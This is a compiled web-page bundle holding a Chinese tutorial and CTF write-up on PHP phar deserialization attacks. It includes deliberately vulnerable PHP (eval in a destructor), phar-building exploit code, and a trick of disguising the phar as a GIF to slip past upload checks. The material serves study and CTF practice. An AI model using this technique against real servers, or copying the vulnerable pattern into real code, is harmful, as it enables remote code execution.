(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{488:function(a,s,t){"use strict";t.r(s);var e=t(32),n=Object(e.a)({},(function(){var a=this,s=a.$createElement,t=a._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h2",{attrs:{id:"开始的一点废话"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#开始的一点废话"}},[a._v("#")]),a._v(" 开始的一点废话")]),a._v(" "),t("p",[a._v("最近比赛打的挺菜的，但是还是跟着师傅们学到了很多东西的，不管怎么样，还是踏踏实实一点点学，仔细写写PHP代码，不能浮于表面。")]),a._v(" "),t("h2",{attrs:{id:"前言"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[a._v("#")]),a._v(" 前言")]),a._v(" "),t("p",[a._v("通常利用反序列化漏洞的时候，只能将反序列化后的字符串传入到unserialize()中，这种漏洞随着代码安全性的提高之后难以利用。在2018年的Black Hat会议上，Sam Thomas提出了利用phar文件会以序列化字符串的形式存储用户自定义的meta_data这一点特性，拓展了php反序列化漏洞的攻击。该方法依赖于文件系统的函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议对phar文件内容的解析，自动反序列化meta_data中的内容，可以不依赖于unserialize()进行反序列化操作。")]),a._v(" "),t("p",[a._v("参考：https://paper.seebug.org/680/")]),a._v(" "),t("hr"),a._v(" "),t("h2",{attrs:{id:"原理分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#原理分析"}},[a._v("#")]),a._v(" 原理分析")]),a._v(" "),t("p",[a._v("在先说phar文件如何实现php反序列化攻击的之前，先要明白什么是phar文件以及phar文件的结构。")]),a._v(" "),t("h3",{attrs:{id:"什么是phar文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#什么是phar文件"}},[a._v("#")]),a._v(" 什么是phar文件")]),a._v(" "),t("ul",[t("li",[a._v("phar(PHP Archive)是PHP里的一种打包文件，用于归档 。PHP版本>=5.3的时候默认开启对phar文件的支持。")]),a._v(" "),t("li",[a._v("phar文件默认状态是只读。使用phar文件不需要任何额外配置。")]),a._v(" "),t("li",[a._v("phar://伪协议用来解析phar文件的内容。")])]),a._v(" "),t("h3",{attrs:{id:"phar文件的结构"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#phar文件的结构"}},[a._v("#")]),a._v(" phar文件的结构")]),a._v(" "),t("h4",{attrs:{id:"a-stub"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#a-stub"}},[a._v("#")]),a._v(" a stub")]),a._v(" "),t("p",[a._v("可以理解位一种标志，其格式为"),t("code",[a._v("xxx<?php xxx;__HALT_COMPILER();?>")]),a._v("，前面的内容不限，但是一定要以"),t("code",[a._v("__HALT_COMPILER();?>")]),a._v("来结尾，否则phar扩展无法识别这个文件，也就是说，phar扩展是以"),t("code",[a._v("__HALT_COMPILER();?>")]),a._v("为标志来识别phar文件的。")]),a._v(" "),t("h4",{attrs:{id:"a-manifest-describing-the-contents"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#a-manifest-describing-the-contents"}},[a._v("#")]),a._v(" a manifest describing the contents")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/5791f169574331596e7a890477a368438f51b6c008748d62b0410016bc636a79.png",alt:"图2"}}),t("br"),a._v("\nphar文件的本质就是一种压缩文件，每个被压缩文件的权限，属性等信息都被存放在这里，另外，用户自定义的meta-data也会被储存在这里，这是实现phar文件攻击的核心。")]),a._v(" "),t("h4",{attrs:{id:"the-file-contents"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#the-file-contents"}},[a._v("#")]),a._v(" the file contents")]),a._v(" "),t("p",[a._v("被压缩的内容")]),a._v(" "),t("h4",{attrs:{id:"optional-a-signature-for-verifying-phar-integrity-phar-file-format-only"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#optional-a-signature-for-verifying-phar-integrity-phar-file-format-only"}},[a._v("#")]),a._v(" [optional] a signature for verifying Phar integrity (phar file format only)")]),a._v(" "),t("p",[a._v("文件签名，放在文件末尾。格式如下：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/aa6adc74de3e477fe1a1e90c929ca60b3a5e890aca2c9a5a54e4e9960e7ce12a.png",alt:"图3"}})]),a._v(" "),t("hr"),a._v(" "),t("h2",{attrs:{id:"利用phar文件攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用phar文件攻击"}},[a._v("#")]),a._v(" 利用phar文件攻击")]),a._v(" "),t("h3",{attrs:{id:"demo1-任意代码执行（多见于ctf）"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#demo1-任意代码执行（多见于ctf）"}},[a._v("#")]),a._v(" Demo1 任意代码执行（多见于CTF）")]),a._v(" "),t("p",[a._v("要攻击的站点源码如下：")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("<?php\n\nclass Flag{\n    public $code;\n    public function __destruct()\n    {\n        // TODO: Implement __destruct() method.\n        eval($this->code);\n    }\n}\n\n$filename = $_GET['filename'];\n\nfile_exists($filename);\n\n?>\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br"),t("span",{staticClass:"line-number"},[a._v("16")]),t("br")])]),t("p",[a._v("传入文件名，检测该文件是否存在。")]),a._v(" "),t("p",[a._v("下面开始构造phar文件进行任意代码执行")]),a._v(" "),t("ul",[t("li",[a._v("（注）开启phar文件的生成权限需要修改php的配置文件php.ini，将"),t("code",[a._v(";phar.readonly = On")]),a._v("修改为"),t("code",[a._v("Off")]),a._v("即可，注意去掉"),t("code",[a._v(";")]),a._v("。\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/16568b05dc47f6a033d3d7a4558b0b8062b97c9842899500555e490a1273a8f5.png",alt:"图4"}})])]),a._v(" "),t("ol",[t("li",[a._v("生成一个phar文件，生成phar文件的代码如下：")])]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v('\n<?php\nclass Flag{\n    public $code;\n}               //要攻击站点已存在的类\n                \n@unlink("test.phar");   //文件名 test.phar\n$phar = new Phar("test.phar");       \n$phar->startBuffering();\n$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置sub\n$a = new Flag();   //实例化类，让phar文件自动序列化，利用phar文件自动序列化meta_data的特点进行攻击\n$a->code = "phpinfo();";\n$phar->setMetadata($a); //将自定义的meta_data存入manifest\n$phar->addFromString("test.txt", "test"); //要压缩的文件\n$phar->stopBuffering(); //自动计算签名\n?>\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br"),t("span",{staticClass:"line-number"},[a._v("16")]),t("br")])]),t("ol",{attrs:{start:"2"}},[t("li",[t("p",[a._v("执行完上述代码之后，会在本地这个php文件的同目录下生成一个phar文件。如下图：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/8c24f29c81b0880306154327242b1d19cd9b2aad6ee56eec73f46b0ea3b84e6f.png",alt:"图5"}})])]),a._v(" "),t("li",[t("p",[a._v("用winhex查看该文件：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/241fa2ce3416d96d418aafb98f4685924683f23d523c5ada0cb4735a17d4b659.png",alt:"图6"}})])]),a._v(" "),t("li",[t("p",[a._v("可以看到，我们自定义的meta_data以序列化字符串的形式存储在了phar文件里。有序列化必然会有反序列化，PHP的大部分文件系统函数在通过phar://协议解析phar文件的时候，都会将meta_data进行反序列化操作，受影响的文件系统函数如下：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/f8582ab5a85283deda73be8e363adc3c27a8d93a2bf5847b900c2241732b0d5f.png",alt:"图7"}})])]),a._v(" "),t("li",[t("p",[a._v("利用phar文件以及phar://伪协议进行攻击：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/e9a13eb25df33d1acced550ac26b97aef5805a74756a6900657a2d4cd5bb8dd8.png",alt:"图8"}})])])]),a._v(" "),t("p",[a._v("实现了任意代码执行。")]),a._v(" "),t("ul",[t("li",[a._v("来看php底层是怎么处理的：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/2a67ea04071d7c0cd911d069c22a305f63cc8c1bc4920b24dff2889ed1c77a6a.png",alt:"图9"}})])]),a._v(" "),t("p",[a._v("可以看到，底层代码对meta_data进行了反序列化操作。")]),a._v(" "),t("h3",{attrs:{id:"demo2-phar文件幻数"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#demo2-phar文件幻数"}},[a._v("#")]),a._v(" Demo2 phar文件幻数")]),a._v(" "),t("ul",[t("li",[a._v("之前提到过，phar扩展是以"),t("code",[a._v("__HALT_COMPILER();?>")]),a._v("来识别phar文件的，也就是说，我们可以修改phar文件头前半部分的内容，来绕过某些检测。")])]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v('<?php\nclass Flag{\n    public $code;\n}               //要攻击站点已存在的类\n                \n@unlink("test.phar");   //文件名 test.phar\n$phar = new Phar("test.phar");       \n$phar->startBuffering();\n$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置sub\n$a = new Flag();   //实例化类，让phar文件自动序列化，利用phar文件自动序列化meta_data的特点进行攻击\n$a->code = "phpinfo();";\n$phar->setMetadata($a); //将自定义的meta_data存入manifest\n$phar->addFromString("test.txt", "test"); //要压缩的文件\n$phar->stopBuffering(); //自动计算签名\n?>\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br")])]),t("p",[a._v("在sub中新增加了"),t("code",[a._v("GIF89a")]),a._v("这部分，将phar文件伪装成GIF文件来绕过某些检测。\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/075787b07b4cd28e7c4c8b5dc1a711d9379fc2a4c2ce53117acf924bc37047e2.png",alt:"图10"}})]),a._v(" "),t("p",[a._v("将生成的test.phar文件修改后缀名，改为test.gif，再次进行测试：\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/e1bff0a27b7d9c8d965827f368a6b083d4df5c65bbe3ed1a2093460f948c52a0.png",alt:"图11"}})]),a._v(" "),t("hr"),a._v(" "),t("h2",{attrs:{id:"利用条件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用条件"}},[a._v("#")]),a._v(" 利用条件")]),a._v(" "),t("ul",[t("li",[a._v("phar文件必须可以上传到服务端。")]),a._v(" "),t("li",[a._v("必须要有可以利用的魔术方法(__wakeup()、__destruct())等。")]),a._v(" "),t("li",[a._v("文件系统的相关函数参数可控，且"),t("code",[a._v("phar")]),a._v("、"),t("code",[a._v(":")]),a._v("、"),t("code",[a._v("/")]),a._v("等关键字没有被过滤。")])]),a._v(" "),t("hr"),a._v(" "),t("h2",{attrs:{id:"geekgame-2020-反序列化？"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#geekgame-2020-反序列化？"}},[a._v("#")]),a._v(" [GeekGame 2020] 反序列化？")]),a._v(" "),t("ol",[t("li",[a._v("进入题目，是一个文件上传的页面，下面给了提示，所以我们到"),t("code",[a._v("/vulnerable.php")]),a._v("看看。")]),a._v(" "),t("li",[a._v("直接给了源码：")])]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v('<?php\nhighlight_file(__FILE__);\nif (isset($_GET[\'filename\'])) {\n    $filename = $_GET[\'filename\'];\n} else {\n    $filename = "";\n}\n\nclass Flag\n{\n    private $code;\n\n    function __destruct()\n    {\n        // TODO: Implement __destruct() method.\n        eval($this->code);\n    }\n}\n\nif (file_exists($filename)) {\n    echo "文件存在的呢;";\n} else {\n    echo "啊这，文件不在哦";\n}\n?>\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br"),t("span",{staticClass:"line-number"},[a._v("16")]),t("br"),t("span",{staticClass:"line-number"},[a._v("17")]),t("br"),t("span",{staticClass:"line-number"},[a._v("18")]),t("br"),t("span",{staticClass:"line-number"},[a._v("19")]),t("br"),t("span",{staticClass:"line-number"},[a._v("20")]),t("br"),t("span",{staticClass:"line-number"},[a._v("21")]),t("br"),t("span",{staticClass:"line-number"},[a._v("22")]),t("br"),t("span",{staticClass:"line-number"},[a._v("23")]),t("br"),t("span",{staticClass:"line-number"},[a._v("24")]),t("br"),t("span",{staticClass:"line-number"},[a._v("25")]),t("br")])]),t("ol",{attrs:{start:"3"}},[t("li",[a._v("很明显是利用反序列化调用"),t("code",[a._v("__destruct()")]),a._v("方法来执行任意代码，但是没有unserialize()函数，要想调用魔术方法，结合题目一开始的文件上传，很容易想到phar文件的上传。")]),a._v(" "),t("li",[a._v("利用Demo所示的代码，生成phar文件，改为GIF文件来绕过检测，直接拿到Flag。\n"),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/0bd2f16fb119b987ae2c33b18c31de21b4c41f27f4a655235a92016e41d62a43.png",alt:"图12"}}),t("br"),a._v(" "),t("img",{attrs:{src:"https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/93c58d7f46a4ec11f377fe41928adb4ee5c4918315467b3f7afb4e53f2eaf75a.png",alt:"图13"}})])]),a._v(" "),t("h2",{attrs:{id:"后记"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#后记"}},[a._v("#")]),a._v(" 后记")]),a._v(" "),t("p",[a._v("比赛当时拿到这道题目没有一点思路，多亏了一位师傅提醒“一个phar文件的上传”，才拿到了Flag，故有此文。")])])}),[],!1,null,null,null);s.default=n.exports}}]);